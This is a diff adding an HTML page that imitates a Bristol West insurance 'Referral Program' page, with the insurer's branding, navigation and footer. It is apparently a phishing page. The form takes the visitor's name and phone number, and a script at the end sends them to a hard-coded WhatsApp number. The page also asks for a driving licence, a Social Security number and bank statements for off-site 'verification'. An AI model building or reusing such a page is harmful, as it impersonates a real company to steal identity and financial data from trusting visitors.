@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+      <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Font Awesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">
+
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="reherral.css">
+</head>
+<body>
+      <!-- Header Start -->
+  <header class="bw-header" tabindex="-1">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bw-navbar" role="navigation">
+
+        <a href="" class="visually-hidden-focusable">Skip to Main Content</a>
+
+        <a class="navbar-brand bw-brand" href="/">
+          <img
+            src="./images/logo-bristol-west-new.jpg"
+            alt="Bristol West Logo"
+            class="bw-logo"
+          >
+        </a>
+
+        <button
+          class="navbar-toggler bw-toggler ms-auto"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#bwMainNavbar"
+          aria-controls="bwMainNavbar"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse bw-nav-collapse" id="bwMainNavbar">
+
+          <div class="d-lg-none bw-mobile-menu-head">
+            <span>Menu</span>
+            <button
+              class="btn bw-close-btn"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#bwMainNavbar"
+              aria-label="Close menu"
+            >
+              X
+            </button>
+          </div>
+
+          <ul class="navbar-nav mx-auto bw-main-menu">
+            <li class="nav-item">
+              <a class="nav-link" title="Home" aria-label="Home" href="/">Home</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" title="Why Bristol West" aria-label="Why Bristol West" href="why-bristo.html">Why Bristol West</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" title="Auto Insurance 101" aria-label="Auto Insurance 101" href="auto-insurance101.html">Auto Insurance 101</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" title="Referral Program" aria-label="Referral Program" href="">Referral Program</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" title="Claims" aria-label="Claims" href="claim.html">Claims</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link bw-start-quote-link" title="Start Quote" aria-label="Start Quote" href="/">Start Quote</a>
+            </li>
+
+            
+          </ul>
+
+          <ul class="navbar-nav bw-lang-menu">
+            <li class="nav-item">
+              <a class="nav-link" title="Login" aria-label="Login" href="">
+                <i class="fa-solid fa-user"></i>
+                Login
+              </a>
+            </li>
+          </ul>
+
+        </div>
+      </nav>
+    </div>
+  </header>
+  <!-- Header End -->
+    <section class="referral-section">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-8">
+
+                <div class="referral-card">
+                    <div class="referral-header">
+                        <span class="referral-badge">Referral Program</span>
+                        <h1>Get Registered Yourself Now</h1>
+                        <p>
+                            Submit your basic details. Our team will guide you for secure document verification.
+                        </p>
+                    </div>
+
+                    <form id="referralForm" class="referral-form">
+
+                        <div class="row g-3">
+                            <div class="col-12 col-md-6">
+                                <label>First Name</label>
+                                <input type="text" id="firstName" class="form-control" placeholder="Enter first name" required>
+                            </div>
+
+                            <div class="col-12 col-md-6">
+                                <label>Last Name</label>
+                                <input type="text" id="lastName" class="form-control" placeholder="Enter last name" required>
+                            </div>
+
+                            <div class="col-12">
+                                <label>Phone Number</label>
+                                <input type="tel" id="phoneNumber" class="form-control" placeholder="Enter phone number" required>
+                            </div>
+
+                            <div class="col-12">
+                                <div class="secure-box">
+                                    <h4>Required Documents</h4>
+                                    <ul>
+                                        <li>Driving license photo front and back</li>
+                                        <li>9 digit SSN</li>
+                                        <li>Last 3 months bank statement</li>
+                                    </ul>
+                                    <p>
+                                        These documents should be submitted only through a secure verification process.
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="col-12">
+                                <button type="submit" class="btn referral-btn">
+                                    Get Register Yourself Now
+                                </button>
+                            </div>
+                        </div>
+
+                    </form>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</section>
+  <!-- Footer Start -->
+  <footer class="bw-footer">
+    <div class="container-fluid">
+
+      <div class="row text-center">
+        <div class="col-12">
+          <ul class="nav justify-content-center bw-footer-nav">
+
+            <li class="nav-item">
+              <a class="nav-link" href="about.html">About Us</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="contact.html">Contact Us</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="terms.html">Terms of Use</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="" target="_blank">Careers</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="" target="_blank">Privacy Center</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="" target="_blank">
+                Do Not Sell or Share My Personal Information
+              </a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="faqs.html">FAQ</a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="">
+                Find an Agent or Broker
+              </a>
+            </li>
+
+            <li class="nav-item">
+              <a class="nav-link" href="">Sitemap</a>
+            </li>
+
+            <li class="nav-item d-flex align-items-center justify-content-center">
+              <a class="nav-link" href="#">Your Privacy Choices</a>
+              
+            </li>
+
+          </ul>
+        </div>
+      </div>
+
+      <div class="row mt-4 justify-content-center align-items-start">
+        <div class="col-12 col-md-auto mb-4 text-center">
+          <a href="/" aria-label="BristolWest Home">
+            <img
+              src="./images/bw-logo-white.webp"
+              width="49"
+              height="48"
+              alt=""
+            >
+          </a>
+
+          <a href="" title="farmers.com" class="ms-4">
+            <img
+              src="./images/farmers_logo.svg"
+              width="89"
+              height="48"
+              alt=""
+            >
+          </a>
+        </div>
+
+        <div class="col-12 col-md-8 col-lg-6">
+          <p class="bw-footer-disclaimer">
+            Bristol West is a proud member of the Farmers Insurance Group of Companies,
+            one of the nation’s largest insurer groups that offers a wide variety of
+            home, life, specialty, commercial and auto insurance products and services
+            across the <span class="text-nowrap">United States.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="row justify-content-center g-3 text-center">
+        <div class="col-auto">
+          <a href="" target="_blank">
+            <img
+              src="./images/ios.webp"
+              width="110"
+              height="32"
+              alt="Download on the App Store"
+            >
+          </a>
+        </div>
+
+        <div class="col-auto">
+          <a href="" target="_blank">
+            <img
+              src="./images/android.webp"
+              width="110"
+              height="32"
+              alt="Get it on Google Play"
+            >
+          </a>
+        </div>
+      </div>
+
+      <div class="text-center pt-3">
+        <p class="bw-copy">© 2026 Bristol West. All rights reserved</p>
+        <p class="bw-report">
+          <a href="" target="_blank" rel="noopener">
+            Report a Vulnerability
+          </a>
+        </p>
+      </div>
+
+    </div>
+  </footer>
+  <!-- Footer End -->
+<script>
+document.getElementById("referralForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    var firstName = document.getElementById("firstName").value;
+    var lastName = document.getElementById("lastName").value;
+    var phoneNumber = document.getElementById("phoneNumber").value;
+
+    var whatsappNumber = "923292640936";
+
+    var message =
+        "Referral Program Registration Request%0A%0A" +
+        "First Name: " + encodeURIComponent(firstName) + "%0A" +
+        "Last Name: " + encodeURIComponent(lastName) + "%0A" +
+        "Phone Number: " + encodeURIComponent(phoneNumber) + "%0A%0A" +
+        "Please guide me for secure document verification.";
+
+    window.open("https://wa.me/" + whatsappNumber + "?text=" + message, "_blank");
+});
+</script>
+</body>
+</html>
